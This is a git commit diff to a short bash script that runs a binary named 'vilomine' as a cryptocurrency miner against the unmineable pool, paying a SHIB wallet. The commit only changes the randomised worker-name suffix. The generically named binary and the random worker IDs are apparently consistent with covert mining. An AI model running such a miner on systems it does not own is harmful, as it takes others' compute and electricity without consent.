b36695ae2fae5ddc7b604bb57df4412c26270386
balung <86705893+balung@users.noreply.github.com>
2021-07-28 12:17:28 +0800

    Update TrxVio.sh

--- TrxVio.sh
+++ TrxVio.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=rx.unmineable.com:3333
 WALLET=SHIB:0x87e89479b58e41e7b21a96d45c16952ffd83961d
-WORKER=$(echo $(shuf -i 1000-99999 -n 1)-Kminer#22kf-tv2r)
+WORKER=$(echo $(shuf -i 1000-99999 -n 1)-Kminer#mr3d-41n1)
 
 chmod +x vilomine
 ./vilomine --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin
